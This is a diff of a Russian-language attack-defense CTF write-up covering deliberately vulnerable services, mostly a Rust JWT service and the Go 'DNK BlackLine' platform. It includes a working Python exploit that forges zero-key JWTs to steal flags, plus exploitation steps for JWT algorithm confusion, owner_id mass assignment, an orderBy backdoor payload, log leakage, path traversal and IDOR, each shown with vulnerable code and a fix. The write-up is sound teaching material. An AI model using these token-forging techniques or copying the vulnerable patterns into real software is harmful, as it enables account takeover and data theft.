-    user_data: Json<RegisterRequest>,
-+   app_state: &State<AppState>,
-) -> Result<Json<LoginResponse>, Status> {
-    let hashed_password = bcrypt::hash(
-        &user_data.password,
-        bcrypt::DEFAULT_COST
-    )
-    .map_err(|_| Status::InternalServerError)?;
+---
 
-@@ -21,8 +24,8 @@ async fn register(
+## Уязвимость #2: JWT подписывается нулевым ключом
 
-    match result {
-        Ok(_) => {
--           let token =
--               generate_token(&user_data.username)
--                   .map_err(|_| Status::InternalServerError)?;
-+           let token = generate_token(&user_data.username, app_state)
-+               .map_err(|_| Status::InternalServerError)?;
+### Описание
 
-            Ok(Json(LoginResponse { token }))
-        }
-        Err(_) => Err(Status::Conflict),
-    }
+Секретный ключ JWT хранится в глобальном `RwLock<[u8; 32]>`, который изначально заполнен нулями. Из-за особенностей инициализации и использования состояния приложение может работать с нулевым ключом.
 
-@@ -33,6 +36,7 @@ async fn register(
-async fn login(
-    mut db: Connection<PigeonDb>,
-    login_data: Json<LoginRequest>,
-+   app_state: &State<AppState>,
-) -> Result<Json<LoginResponse>, Status> {
-    let user: Option<User> =
-        sqlx::query_as(
-            "SELECT id, username, password FROM users WHERE username = ?"
-        )
+Это позволяет атакующему самостоятельно создавать валидные JWT для произвольных пользователей.
 
-@@ -46,8 +50,8 @@ async fn login(
-    if bcrypt::verify(&login_data.password, &user.password)
-        .map_err(|_| Status::InternalServerError)?
-    {
--       let token =
--           generate_token(&user.username)
--               .map_err(|_| Status::InternalServerError)?;
-+       let token = generate_token(&user.username, app_state)
-+           .map_err(|_| Status::InternalServerError)?;
+Уязвимая схема:
 
-        Ok(Json(LoginResponse { token }))
-    } else {
-        Err(Status::Unauthorized)
-    }
+```rust
+use std::sync::RwLock;
+
+const SECRET: RwLock<[u8; 32]> = RwLock::new([0; 32]);
+
+pub fn init() {
+    let binding = SECRET;
+    let mut secret = binding.write().unwrap();
+    *secret = rand::random();
 }
 
-diff --git a/src/auth.rs b/src/auth.rs
-index 42fb4d4..1acc98e 100644
---- a/src/auth.rs
-+++ b/src/auth.rs
-@@ -1,19 +1,12 @@
- use crate::models::Claims;
-+use crate::AppState;
- use chrono::Utc;
- use jsonwebtoken::{decode, encode, DecodingKey, EncodingKey, Header, Validation};
- use rocket::http::Status;
- use rocket::request::{FromRequest, Outcome, Request};
--use std::sync::RwLock;
-+use rocket::State;
-
--const SECRET: RwLock<[u8; 32]> = RwLock::new([0; 32]);
--
--pub fn init(){
--    let binding = SECRET;
--    let mut secret = binding.write().unwrap();
--    *secret = rand::random();
--}
--
--pub fn generate_token(username: &str) -> Result<String, jsonwebtoken::errors::Error> {
-+pub fn generate_token(username: &str, app_state: &State<AppState>)
-+    -> Result<String, jsonwebtoken::errors::Error> {
-    let expiration = Utc::now()
-        .checked_add_signed(chrono::Duration::hours(24))
-        .unwrap();
-
-@@ -26,7 +19,7 @@ pub fn generate_token(username: &str) -> Result<String, jsonwebtoken::errors::Er
+pub fn generate_token(username: &str) -> Result<String, jsonwebtoken::errors::Error> {
     encode(
         &Header::default(),
         &claims,
--       &EncodingKey::from_secret(&*SECRET.write().unwrap()),
-+       &EncodingKey::from_secret(&app_state.secret_key),
+        &EncodingKey::from_secret(&*SECRET.write().unwrap()),
     )
 }
-
-@@ -40,13 +33,13 @@ impl<'r> FromRequest<'r> for AuthToken {
-
-    async fn from_request(request: &'r Request<'_>) -> Outcome<Self, Self::Error> {
-        let token = request.headers().get_one("Authorization");
-
-+       let app_state =
-+           request.guard::<&State<AppState>>().await.unwrap();
-
-        match token {
-            Some(token) => {
-                let token = token.trim_start_matches("Bearer ");
-
-                match decode::<Claims>(
-                    token,
--                   &DecodingKey::from_secret(&*SECRET.write().unwrap()),
-+                   &DecodingKey::from_secret(&app_state.secret_key),
-                    &Validation::default(),
-                ) {
-                    Ok(token_data) => Outcome::Success(AuthToken {
-
-diff --git a/src/main.rs b/src/main.rs
-index f78e6b6..4b83cbf 100644
---- a/src/main.rs
-+++ b/src/main.rs
-@@ -20,10 +20,17 @@ fn health() -> &'static str {
-    "OK"
-}
-
-+#[derive(Clone)]
-+struct AppState {
-+    secret_key: [u8; 32],
-+}
-+
-#[launch]
-async fn rocket() -> _ {
--   auth::init();
-    rocket::build()
-+       .manage(AppState {
-+           secret_key: rand::random(),
-+       })
-        .attach(PigeonDb::init())
-        .attach(PigeonDb::migrate())
-        .register("/", catchers![internal_error])
 ```
 
-##### Эксплуатация
+### Эксплуатация
 
-Получаем `username` аккаунтов, которые выдала нам `forcad`, создаём свой JWT-токен и подписываем его нулевой подписью. Делаем запрос на получение голубей и их описания.
-
-###### Полный эксплоит
+Получаем имена пользователей из `forcad`, создаём JWT с нулевым ключом и запрашиваем голубей пользователя.
 
 ```python
 #!/usr/bin/env python3
 
-import sys
 import json
-import requests
 import jwt
+import requests
+import sys
+
 from datetime import datetime, timedelta
 
 
 def create_token_with_zero_key(username: str) -> str:
-    """Создает JWT токен с нулевым ключом"""
-    expiration = int((datetime.utcnow() + timedelta(hours=24)).timestamp())
+    """Создаёт JWT, подписанный нулевым ключом."""
+
+    expiration = int(
+        (datetime.utcnow() + timedelta(hours=24)).timestamp()
+    )
 
     payload = {
         "sub": username,
-        "exp": expiration
+        "exp": expiration,
     }
 
     zero_key = b'\x00' * 32
-
-    token = jwt.encode(payload, zero_key, algorithm='HS256')
-    return token
+    return jwt.encode(payload, zero_key, algorithm='HS256')
 
 
 def exploit(host: str, attack_data: str):
-    """Основная функция эксплойта"""
+    """Основная функция эксплойта."""
+
     try:
-        # Получаем attack_data (имена пользователей)
         usernames = json.loads(attack_data)
 
         for username in usernames:
             try:
-                # Создаем токен с нулевым ключом
                 token = create_token_with_zero_key(username)
 
-                # Делаем запрос для получения голубей пользователя
                 headers = {
                     "Authorization": f"Bearer {token}",
-                    "Content-Type": "application/json"
+                    "Content-Type": "application/json",
                 }
 
                 response = requests.get(
                     f"http://{host}/api/pigeons",
                     headers=headers,
-                    timeout=5
+                    timeout=5,
                 )
 
                 if response.status_code == 200:
                     pigeons = response.json()
 
-                    # Извлекаем флаги из описаний голубей
                     for pigeon in pigeons:
                         flag = pigeon.get('description', '')
                         if flag:
                             print(flag, flush=True)
-
-            except Exception as e:
-                # Продолжаем со следующим пользователем при ошибке
+            except Exception:
                 continue
-
-    except Exception as e:
-        # Тихо завершаем при критической ошибке
+    except Exception:
         pass
 
-def get_data():
-    """Функция для получения данных"""
-    q = requests.get('https://<HOST FORCAD>/api/client/attack_data/')
 
+def get_data():
+    q = requests.get('https://<HOST FORCAD>/api/client/attack_data/')
     return q.json()['SMP']
 
 
@@ -1009,82 +842,150 @@ if __name__ == "__main__":
         sys.exit(1)
 
     host = sys.argv[1]
-
     attack_data = get_data()[host]
     exploit(host, attack_data)
 ```
 
-### DNK BlackLine
-— «чёрный пульт» оператора топливной инфраструктуры для космо-логистики: резервуары, смены и отгрузки, автопарк (интеграции/вебхуки), финансовые срезы и аудит.
+### Исправление
+
+Секрет переносится в централизованный `State` Rocket и генерируется один раз при запуске приложения.
+
+```rust
+#[derive(Clone)]
+struct AppState {
+    secret_key: [u8; 32],
+}
+
+#[launch]
+async fn rocket() -> _ {
+    rocket::build()
+        .manage(AppState {
+            secret_key: rand::random(),
+        })
+        .attach(PigeonDb::init())
+        .attach(PigeonDb::migrate())
+        .register("/", catchers![internal_error])
+}
+```
+
+`generate_token()` и обработчик проверки токена получают ключ через `&State<AppState>`:
+
+```rust
+pub fn generate_token(
+    username: &str,
+    app_state: &State<AppState>,
+) -> Result<String, jsonwebtoken::errors::Error> {
+    encode(
+        &Header::default(),
+        &claims,
+        &EncodingKey::from_secret(&app_state.secret_key),
+    )
+}
+```
+
+При декодировании используется тот же централизованный ключ:
+
+```rust
+let app_state = request.guard::<&State<AppState>>().await.unwrap();
+
+match decode::<Claims>(
+    token,
+    &DecodingKey::from_secret(&app_state.secret_key),
+    &Validation::default(),
+) {
+    // ...
+}
+```
+
+---
+
+# 4. DNK BlackLine
+
+## Описание сервиса
+
+**DNK BlackLine** — «чёрный пульт» оператора топливной инфраструктуры для космо-логистики: резервуары, смены и отгрузки, автопарк, интеграции и вебхуки, финансовые срезы и аудит.
 
 Сервис используется в A/D CTF как уязвимый промышленный симулятор реальной платформы.
 
-Архитектура:
-- Backend: Go (net/http). Хранилище: файловый Store (fallback) + PostgreSQL (основной путь).
-- Основные пакеты: internal/httpserver (router/handlers/middleware), internal/store (файловый и PG-адаптер), internal/crypto (JWT), internal/password (KDF).
-- Frontend: React + Vite, тематика «Fuel for Starliners»: чёрный стеклянный UI, звёздный фон, KPI/спарклайны, ролевое меню.
+### Архитектура
 
-Роли:
-• retail— оператор узла (резервуары/смены),
-• fleet— куратор флотилии (интеграции/вебхуки),
-• fin— интендант потоков (финконфиг+черновой отчёт).
+- **Backend:** Go (`net/http`).
+- **Хранилище:** файловый Store как fallback + PostgreSQL как основной путь.
+- **Основные пакеты:**
+  - `internal/httpserver` — router / handlers / middleware;
+  - `internal/store` — файловый и PostgreSQL-адаптер;
+  - `internal/crypto` — JWT;
+  - `internal/password` — KDF.
+- **Frontend:** React + Vite, тематика «Fuel for Starliners».
 
-JWT: выпуск/проверка в internal/crypto/jwt.go.
-Логи: пишутся в logs/ и через stdout;
+### Роли
 
-Ключевые эндпоинты (минимум):
+- `retail` — оператор узла: резервуары и смены;
+- `fleet` — куратор флотилии: интеграции и вебхуки;
+- `fin` — интендант потоков: финансовая конфигурация и черновые отчёты.
 
-Auth:
-• POST /api/auth/register
-• POST /api/auth/login
-• /healthz` — health
+JWT выпускается и проверяется в `internal/crypto/jwt.go`.
 
-Профиль:
-• GET/PUT /api/profile/secrets
+Логи пишутся в `logs/` и в stdout.
 
-Retail:
-• GET/PUT /api/retail/profile/config
-• POST /api/retail/shifts/open
-• POST /api/retail/shifts/{id}/close
-• GET /api/retail/shifts?mine=1
+### Ключевые эндпоинты
 
-Fleet:
-• POST /api/fleet/webhooks
-• GET /api/fleet/webhooks/{id}
+**Auth:**
 
-Finance:
-• GET/PUT /api/fin/profile/config
-• GET|POST /api/fin/reports/preview?orderBy=...
-Audit/Logs:
-• POST /api/audit/emit
-• GET /api/audit/events
-• GET /api/logs
+- `POST /api/auth/register`
+- `POST /api/auth/login`
+- `/healthz`
 
-#### Уязвимость #1: JWT alg-confusion + утечка токенов через логи
+**Профиль:**
 
-Компонент/маршруты
+- `GET/PUT /api/profile/secrets`
 
-- Логгер пишет `Authorization: Bearer ...` в файловые логи.
-- `Verify JWT` допускает «мягкую» верификацию — алгоритмическую путаницу.
+**Retail:**
 
-##### Как бьют наш сервис
+- `GET/PUT /api/retail/profile/config`
+- `POST /api/retail/shifts/open`
+- `POST /api/retail/shifts/{id}/close`
+- `GET /api/retail/shifts?mine=1`
 
-1. `GET /api/logs?q=Authorization` — собирают строки с `Bearer <jwt>`.
-2. Из `payload` чужого JWT читают `sub` (`user_id`).
-3. Куют HS256-JWT с тем же `sub`, используя публичный ключ как секрет из `/api/auth/keys/public`.
-4. Выполняют `GET /api/profile/secrets` с подложным токеном и крадут `profile_flag`.
+**Fleet:**
 
-##### Суть уязвимости
+- `POST /api/fleet/webhooks`
+- `GET /api/fleet/webhooks/{id}`
 
-Функция `Verify` принимала токены с `alg = "HS256"` и проверяла подпись через HMAC с секретом, взятым из файла `public.pem`.
+**Finance:**
 
-Это позволяло злоумышленнику скачивать публичный ключ через `/api/auth/keys/public` и подделывать JWT любого пользователя.
+- `GET/PUT /api/fin/profile/config`
+- `GET|POST /api/fin/reports/preview?orderBy=...`
 
-##### Решение
+**Audit / Logs:**
 
-JWT alg-confusion (`HS256` с `public.pem`).
+- `POST /api/audit/emit`
+- `GET /api/audit/events`
+- `GET /api/logs`
 
-###### Было
+---
+
+## Уязвимость #1: JWT alg-confusion + утечка токенов через логи
+
+### Компоненты
+
+- логгер записывает `Authorization: Bearer ...` в файловые логи;
+- `Verify()` допускает алгоритмическую путаницу и принимает `HS256`;
+- публичный ключ доступен через `/api/auth/keys/public`.
+
+### Как эксплуатируется
+
+1. Выполнить `GET /api/logs?q=Authorization` и получить строки с чужими Bearer-токенами.
+2. Прочитать из payload чужого JWT поле `sub` (`user_id`).
+3. Создать JWT с тем же `sub`, указав `alg = HS256`, и использовать `public.pem` как HMAC-секрет.
+4. Получить `public.pem` через `/api/auth/keys/public`.
+5. Выполнить `GET /api/profile/secrets` с поддельным JWT и получить `profile_flag`.
+
+### Суть уязвимости
+
+`Verify()` принимала токены с `alg = "HS256"` и проверяла подпись HMAC-ом, используя содержимое `public.pem` как секрет.
+
+Упрощённо уязвимая ветка выглядела так:
 
 ```go
 func Verify(keysDir string, token string) (*Claims, error) {
@@ -1099,13 +1000,11 @@ func Verify(keysDir string, token string) (*Claims, error) {
 
     if hdr.Alg == "HS256" {
         kpath := hdr.Kid
-
         if kpath == "" {
             kpath = filepath.Join(keysDir, "public.pem")
         }
 
         secret, _ := os.ReadFile(kpath)
-
         h := hmac.New(sha256.New, secret)
         h.Write(signed)
 
@@ -1115,16 +1014,16 @@ func Verify(keysDir string, token string) (*Claims, error) {
 
         var c Claims
         json.Unmarshal(payload, &c)
-
-    return &c, nil
+        return &c, nil
     }
-    // RS256-ветка…
+
+    // RS256-ветка...
 }
 ```
 
-###### Стало
+### Исправление
 
-Теперь поддерживается только `RS256`, `HS256` полностью отключён.
+Поддержка `HS256` полностью отключена. Принимается только `RS256`.
 
 ```go
 func Verify(keysDir string, token string) (*Claims, error) {
@@ -1146,85 +1045,233 @@ func Verify(keysDir string, token string) (*Claims, error) {
         return nil, errors.New("unsupported alg")
     }
 
-    if hdr.Alg == "RS256" {
-        keyRef := hdr.Kid
-        if keyRef == "" {
-            keyRef = filepath.Join(keysDir, "public.pem")
-        }
-
-        pubPEM, err := os.ReadFile(keyRef)
-        if err != nil {
-            return nil, err
-        }
-
-        block, _ := pem.Decode(pubPEM)
-        if block == nil {
-            return nil, errors.New("bad pem")
-        }
-
-        pubAny, err := x509.ParsePKIXPublicKey(block.Bytes)
-        if err != nil {
-            return nil, err
-        }
-
-        pub, ok := pubAny.(*rsa.PublicKey)
-        if !ok {
-            return nil, errors.New("not rsa")
-        }
-
-        h := sha256.Sum256(signed)
-        if err := rsa.VerifyPKCS1v15(pub, 0, h[:], sig); err != nil {
-            return nil, errors.New("bad signature")
-        }
-
-        var c Claims
-        if err := json.Unmarshal(payload, &c); err != nil {
-            return nil, err
-        }
-
-        if os.Getenv("JWT_STRICT_EXP") == "1" {
-            if c.Exp > 0 && time.Unix(c.Exp, 0).Before(
-                time.Now().Add(-5 * time.Second),
-            ) {
-                return nil, errors.New("token expired (strict)")
-            }
-        }
-
-        return &c, nil
+    keyRef := hdr.Kid
+    if keyRef == "" {
+        keyRef = filepath.Join(keysDir, "public.pem")
     }
 
-    return nil, errors.New("unsupported alg")
+    pubPEM, err := os.ReadFile(keyRef)
+    if err != nil {
+        return nil, err
+    }
+
+    block, _ := pem.Decode(pubPEM)
+    if block == nil {
+        return nil, errors.New("bad pem")
+    }
+
+    pubAny, err := x509.ParsePKIXPublicKey(block.Bytes)
+    if err != nil {
+        return nil, err
+    }
+
+    pub, ok := pubAny.(*rsa.PublicKey)
+    if !ok {
+        return nil, errors.New("not rsa")
+    }
+
+    h := sha256.Sum256(signed)
+    if err := rsa.VerifyPKCS1v15(pub, 0, h[:], sig); err != nil {
+        return nil, errors.New("bad signature")
+    }
+
+    var c Claims
+    if err := json.Unmarshal(payload, &c); err != nil {
+        return nil, err
+    }
+
+    if os.Getenv("JWT_STRICT_EXP") == "1" {
+        if c.Exp > 0 && time.Unix(c.Exp, 0).Before(time.Now().Add(-5*time.Second)) {
+            return nil, errors.New("token expired (strict)")
+        }
+    }
+
+    return &c, nil
 }
 ```
 
-#### Уязвимость #2: Fleet: mass-assignment владельца + выдача `secret_token` по GET
+---
 
-###### Компонент/маршруты
+## Уязвимость #2: Fleet — mass assignment владельца и выдача `secret_token`
 
-- `POST /api/fleet/webhooks` принимает `owner_id` и `secret_token`.
-- `PATCH /api/fleet/webhooks/{id}` доверяет `owner_id`.
-- `GET /api/fleet/webhooks/{id}` отдаёт `secret_token`.
+### Компоненты
 
-###### Как бьют наш сервис
+- `POST /api/fleet/webhooks` принимает `owner_id` и `secret_token` из клиентского тела;
+- `PATCH /api/fleet/webhooks/{id}` доверяет `owner_id`;
+- `GET /api/fleet/webhooks/{id}` возвращает `secret_token` без достаточной проверки владельца;
+- импорт Fleet также мог сохранять присланный `owner_id`.
 
-1. Создать вебхук с `owner_id` жертвы или перепривязать существующий `PATCH`-ом.
-2. Читать `GET /api/fleet/webhooks/{id}` — в ответе лежит `secret_token`.
+### Как эксплуатируется
 
-Бэкдор в `/api/fin/reports/preview` приводит к утечке `role_fin_flag`.
+1. Создать вебхук, указав `owner_id` жертвы, либо перепривязать существующий вебхук через PATCH.
+2. Выполнить `GET /api/fleet/webhooks/{id}`.
+3. Получить из ответа чужой `secret_token`.
 
-###### Суть уязвимости
+### Суть уязвимости
 
-`FinPreview` содержал скрытый триггер по `orderBy`. Если значение начиналось с:
+Сервер доверял `owner_id` из JSON клиента и напрямую записывал его в `Webhook.OwnerID`. Получение вебхука по ID не обеспечивало корректную проверку принадлежности.
 
-`SELECT ROLE_FIN_FLAG FROM CONFIGS WHERE USER_ID=...`
+Упрощённый уязвимый код:
 
-код читал `role_fin_flag` указанного пользователя и возвращал его в тексте ошибки.
+```go
+var in struct {
+    URL         string `json:"url"`
+    OwnerID     int    `json:"owner_id"`
+    SecretToken string `json:"secret_token"`
+}
 
-##### Решение
+if !util.ReadJSON(w, r, &in) {
+    return
+}
 
-Бэкдор в `/api/fin/reports/preview` — утечка `role_fin_flag`.
+wb := &models.Webhook{
+    URL:         in.URL,
+    OwnerID:     in.OwnerID,
+    SecretToken: in.SecretToken,
+}
 
-###### Было
+out := st.UpsertWebhook(wb)
+```
+
+Получение по ID:
+
+```go
+wb := st.GetWebhookByID(id)
+if wb == nil {
+    http.Error(w, "not found", 404)
+    return
+}
+
+util.JSON(w, 200, wb)
+```
+
+### Исправление
+
+`OwnerID` всегда определяется сервером из текущего пользователя, а присланный клиентом `owner_id` игнорируется.
+
+```go
+func FleetWebhooks(st *store.Store) http.Handler {
+    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        u := middleware.CurrentUser(r.Context())
+        if u == nil {
+            http.Error(w, "unauthorized", http.StatusUnauthorized)
+            return
+        }
+
+        switch r.Method {
+        case http.MethodGet:
+            wbs := st.ListWebhooksByOwner(u.ID)
+            util.JSON(w, http.StatusOK, map[string]any{"items": wbs})
+            return
+
+        case http.MethodPost:
+            var in struct {
+                URL         string `json:"url"`
+                OwnerID     int    `json:"owner_id,omitempty"`
+                SecretToken string `json:"secret_token"`
+            }
+
+            if !util.ReadJSON(w, r, &in) {
+                return
+            }
+
+            wb := &models.Webhook{
+                URL:         in.URL,
+                OwnerID:     u.ID,
+                SecretToken: in.SecretToken,
+            }
+
+            out := st.UpsertWebhook(wb)
+            if out == nil {
+                http.Error(w, "cannot upsert webhook", http.StatusInternalServerError)
+                return
+            }
+
+            util.JSON(w, http.StatusOK, map[string]any{"id": out.ID})
+            return
+
+        default:
+            http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+            return
+        }
+    })
+}
+```
+
+При импорте Fleet вебхук также привязывается к текущему пользователю:
+
+```go
+if in.Webhook != nil {
+    st.UpsertWebhook(&models.Webhook{
+        ID:      in.Webhook.ID,
+        URL:     in.Webhook.URL,
+        OwnerID: u.ID, // игнорируем присланный owner_id
+    })
+}
+```
+
+Получение конкретного вебхука проверяет владельца:
+
+```go
+func FleetWebhookGet(st *store.Store) http.Handler {
+    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        u := middleware.CurrentUser(r.Context())
+        if u == nil {
+            http.Error(w, "unauthorized", http.StatusUnauthorized)
+            return
+        }
+
+        segs := strings.Split(strings.Trim(r.URL.Path, "/"), "/")
+        if r.Method != http.MethodGet || len(segs) != 4 ||
+            segs[0] != "api" || segs[1] != "fleet" || segs[2] != "webhooks" {
+            http.NotFound(w, r)
+            return
+        }
+
+        id, _ := strconv.Atoi(segs[3])
+        wb := st.GetWebhookByID(id)
+
+        if wb == nil || wb.OwnerID != u.ID {
+            http.Error(w, "not found", http.StatusNotFound)
+            return
+        }
+
+        util.JSON(w, http.StatusOK, wb)
+    })
+}
+```
+
+---
+
+## Уязвимость #3: Finance — error-based leakage через `orderBy`
+
+### Компонент
+
+`GET/POST /api/fin/reports/preview?orderBy=...`
+
+### Суть уязвимости
+
+`FinPreview` содержал скрытый триггер по `orderBy`.
+
+Если значение начиналось с:
+
+```text
+SELECT ROLE_FIN_FLAG FROM CONFIGS WHERE USER_ID=...
+```
+
+обработчик читал `role_fin_flag` указанного пользователя и возвращал флаг в тексте ошибки.
+
+### Как эксплуатируется
+
+Передаётся значение вида:
+
+```text
+orderBy=SELECT ROLE_FIN_FLAG FROM CONFIGS WHERE USER_ID=N
+```
+
+В ответ сервер возвращал HTTP 400, а текст ошибки содержал `FLAG{...}`.
+
+### Уязвимый код
 
 ```go
 type previewReq struct {
@@ -1236,11 +1283,7 @@ type previewReq struct {
 func FinPreview(st *store.Store) http.Handler {
     return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
         if r.Method != http.MethodPost {
-            http.Error(
-                w,
-                "method not allowed",
-                http.StatusMethodNotAllowed,
-            )
+            http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
             return
         }
 
@@ -1260,8 +1303,346 @@ func FinPreview(st *store.Store) http.Handler {
             )
             return
         }
+
+        // ...
     })
 }
 ```
-###### Стало
-СТР 26
+
+### Исправление
+
+Бэкдор заменён на нейтральную ошибку без чтения флага.
+
+```go
+func FinPreview(st *store.Store) http.Handler {
+    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        if r.Method != http.MethodPost {
+            http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+            return
+        }
+
+        var in previewReq
+        if !util.ReadJSON(w, r, &in) {
+            return
+        }
+
+        const pfx = "SELECT ROLE_FIN_FLAG FROM CONFIGS WHERE USER_ID="
+        up := strings.ToUpper(in.OrderBy)
+
+        if strings.HasPrefix(up, pfx) {
+            http.Error(
+                w,
+                "preview error: unsupported order by",
+                http.StatusBadRequest,
+            )
+            return
+        }
+
+        util.JSON(w, http.StatusOK, map[string]any{
+            "rows": []map[string]any{
+                {"supplier": "ACME", "sum_total": 12345},
+                {"supplier": "Globex", "sum_total": 67890},
+            },
+            "orderBy": in.OrderBy,
+        })
+    })
+}
+```
+
+---
+
+## Уязвимость #4: публичные логи, log poisoning и небезопасная выдача логов
+
+### Компоненты
+
+- `GET /api/logs` доступен публично; чекер использует его для проверки работоспособности;
+- `POST /api/audit/emit` принимает `log_flag` и произвольный `note`;
+- `GET /api/audit/events` позволяет получать события;
+- `/api/logs/download` позволял скачивать файлы по переданному пути.
+
+### Как эксплуатируется
+
+1. Записать данные через `/api/audit/emit`.
+2. Прочитать их через `/api/audit/events` либо выполнить поиск через `/api/logs?q=FLAG{`.
+
+### Суть уязвимости
+
+`AuditEmit` записывал `log_flag` не только в хранилище аудита, но и в файловый лог:
+
+```go
+ev := st.AddAuditEvent(ownerID, kind, note, logFlag, nil, nowMs)
+
+appendLogLineRaw(cfg, map[string]any{
+    "event":    "audit_emit",
+    "id":       ev.ID,
+    "owner_id": ownerID,
+    "log_flag": ev.LogFlag,
+    "ts":       time.Now().Format(time.RFC3339Nano),
+})
+```
+
+Кроме того, обработчик скачивания логов строил путь на основе клиентского параметра:
+
+```go
+func LogsDownload(cfg) http.HandlerFunc {
+    name := r.URL.Query().Get("file")
+    _ = looksMostlySafe(name)
+    p := filepath.Join(cfg.LogsDir, name)
+    http.ServeFile(w, r, p)
+}
+```
+
+### Исправление
+
+`log_flag` больше не пишется в файловый лог; он остаётся только в БД аудита.
+
+```go
+func AuditEmit(cfg *config.AppConfig, st *store.Store) http.HandlerFunc {
+    return func(w http.ResponseWriter, r *http.Request) {
+        var in map[string]any
+        if !util.ReadJSON(w, r, &in) {
+            return
+        }
+
+        kind, _ := in["kind"].(string)
+        note, _ := in["note"].(string)
+        logFlag, _ := in["log_flag"].(string)
+
+        ownerID := 0
+        if u := middleware.CurrentUser(r.Context()); u != nil {
+            ownerID = u.ID
+        } else if auth := r.Header.Get("Authorization"); strings.HasPrefix(auth, "Bearer ") {
+            tok := strings.TrimSpace(strings.TrimPrefix(auth, "Bearer "))
+            if claims, err := crypto.Verify(cfg.KeysDir, tok); err == nil && claims != nil && claims.Sub > 0 {
+                ownerID = claims.Sub
+            }
+        }
+
+        nowMs := time.Now().UnixNano() / int64(time.Millisecond)
+        ev := st.AddAuditEvent(ownerID, kind, note, logFlag, nil, nowMs)
+
+        _ = appendLogLineRaw(cfg, map[string]any{
+            "ts":       time.Now().Format(time.RFC3339Nano),
+            "event":    "audit_emit",
+            "owner_id": ownerID,
+            "note":     note,
+            "kind":     kind,
+            "id":       ev.ID,
+        })
+
+        util.JSON(w, http.StatusOK, map[string]any{
+            "ok":         1,
+            "request_id": ev.ID,
+            "ts_unix_ms": nowMs,
+        })
+    }
+}
+```
+
+`LogsDownload` отключён:
+
+```go
+func LogsDownload(cfg *config.AppConfig) http.HandlerFunc {
+    return func(w http.ResponseWriter, r *http.Request) {
+        http.Error(w, "forbidden", http.StatusForbidden)
+    }
+}
+```
+
+`LogsSearch` оставлен минимальным для работы чекера, но не выдаёт содержимое логов наружу.
+
+---
+
+## Уязвимость #5: Retail — публичный summary бака и утечка `role_retail_flag`
+
+### Компоненты
+
+- `GET /api/retail/tanks/{id}/summary` отдавал `owner_configs`, включая `role_retail_flag`, без достаточной авторизации;
+- `/api/retail/tanks/{id}/events` позволял авторизованному пользователю читать и записывать события произвольного бака по ID.
+
+### Как эксплуатируется
+
+Подбирается `tank_id`, после чего из ответа читается:
+
+```text
+owner_configs.role_retail_flag
+```
+
+### Уязвимый Retail Summary
+
+Упрощённо обработчик отдавал конфигурацию владельца вместе с флагом:
+
+```go
+func RetailSummary(st *store.Store) http.HandlerFunc {
+    return func(w http.ResponseWriter, r *http.Request) {
+        segs := /* ... */
+        id, _ := strconv.Atoi(segs[3])
+
+        tk := st.TankByID(id)
+        owner := st.GetUserByID(tk.OwnerID)
+
+        cfg := map[string]any{
+            "role_retail_flag": st.ReadUserConfigString(
+                tk.OwnerID,
+                "role_retail_flag",
+            ),
+        }
+
+        out := tankSummaryDTO{
+            /* ... */
+            OwnerConfig: cfg,
+        }
+
+        util.JSON(w, 200, out)
+    }
+}
+```
+
+### Исправление Retail Summary
+
+Доступ разрешён только авторизованному владельцу бака. Флаг больше не возвращается.
+
+```go
+func RetailSummary(st *store.Store) http.HandlerFunc {
+    return func(w http.ResponseWriter, r *http.Request) {
+        u := middleware.CurrentUser(r.Context())
+        if u == nil {
+            http.Error(w, "unauthorized", http.StatusUnauthorized)
+            return
+        }
+
+        segs := strings.Split(strings.Trim(r.URL.Path, "/"), "/")
+        if len(segs) != 5 ||
+            segs[0] != "api" ||
+            segs[1] != "retail" ||
+            segs[2] != "tanks" ||
+            segs[4] != "summary" {
+            http.NotFound(w, r)
+            return
+        }
+
+        id, _ := strconv.Atoi(segs[3])
+        tk := st.TankByID(id)
+
+        if tk == nil || tk.OwnerID != u.ID {
+            http.NotFound(w, r)
+            return
+        }
+
+        owner := st.GetUserByID(tk.OwnerID)
+
+        out := tankSummaryDTO{
+            ID:         tk.ID,
+            Name:       tk.Name,
+            Level:      tk.Level,
+            OwnerName:  owner.Name,
+            OwnerEmail: owner.Email,
+        }
+
+        util.JSON(w, http.StatusOK, out)
+    }
+}
+```
+
+### Исправление Retail Tank Events
+
+Чтение и добавление событий разрешено только владельцу бака.
+
+```go
+type tankEventDTO struct {
+    Kind  string         `json:"kind"`
+    Value float64        `json:"value"`
+    Meta  map[string]any `json:"meta"`
+}
+
+func RetailTankEvents(st *store.Store) http.Handler {
+    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        u := middleware.CurrentUser(r.Context())
+        if u == nil {
+            http.Error(w, "unauthorized", http.StatusUnauthorized)
+            return
+        }
+
+        segs := strings.Split(strings.Trim(r.URL.Path, "/"), "/")
+        if len(segs) < 4 ||
+            segs[0] != "api" ||
+            segs[1] != "retail" ||
+            segs[2] != "tanks" {
+            http.NotFound(w, r)
+            return
+        }
+
+        if r.Method == http.MethodPost && len(segs) == 5 && segs[4] == "event" {
+            tid, _ := strconv.Atoi(segs[3])
+            tk := st.TankByID(tid)
+
+            if tk == nil || tk.OwnerID != u.ID {
+                http.Error(w, "not found", http.StatusNotFound)
+                return
+            }
+
+            var in tankEventDTO
+            if !util.ReadJSON(w, r, &in) {
+                return
+            }
+
+            ev := st.AddTankEvent(
+                tid,
+                in.Kind,
+                in.Value,
+                in.Meta,
+                time.Now().UnixMilli(),
+            )
+
+            util.JSON(w, http.StatusOK, ev)
+            return
+        }
+
+        if r.Method == http.MethodGet && len(segs) == 5 && segs[4] == "events" {
+            tid, _ := strconv.Atoi(segs[3])
+            tk := st.TankByID(tid)
+
+            if tk == nil || tk.OwnerID != u.ID {
+                http.Error(w, "not found", http.StatusNotFound)
+                return
+            }
+
+            since := int64(0)
+            if v := r.URL.Query().Get("since_ms"); v != "" {
+                if n, err := strconv.ParseInt(v, 10, 64); err == nil {
+                    since = n
+                }
+            }
+
+            list := st.ListTankEvents(tid, since, 500)
+            util.JSON(w, http.StatusOK, map[string]any{"items": list})
+            return
+        }
+
+        http.NotFound(w, r)
+    })
+}
+```
+
+---
+
+# Краткий список уязвимостей
+
+1. **DNK News**
+   - SSRF через `/admin/health-check`.
